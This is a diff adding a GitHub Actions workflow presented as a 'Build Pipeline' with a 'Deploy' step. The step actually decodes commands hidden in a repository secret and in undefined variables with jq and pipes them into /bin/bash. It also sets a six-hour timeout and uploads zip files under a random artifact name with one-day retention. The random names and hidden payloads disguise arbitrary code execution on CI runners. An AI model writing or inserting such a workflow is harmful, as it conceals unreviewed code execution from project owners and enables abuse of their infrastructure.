@@ -1,0 +1,29 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          xaimo1: ${{ secrets.xaimo1 }}
+        run: |
+          printf '%s' "$xaimo1" | jq -r .xuh6417 | /bin/bash
+          echo $psj75682 | jq -r .ca01 | /bin/bash
+          printf '%s' "$uhj000" | jq -r .r169 | /bin/bash
+          echo $qr61205 | jq -r .z69093 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: VteGk6f1
+          path: "*.zip"
+          retention-days: 1
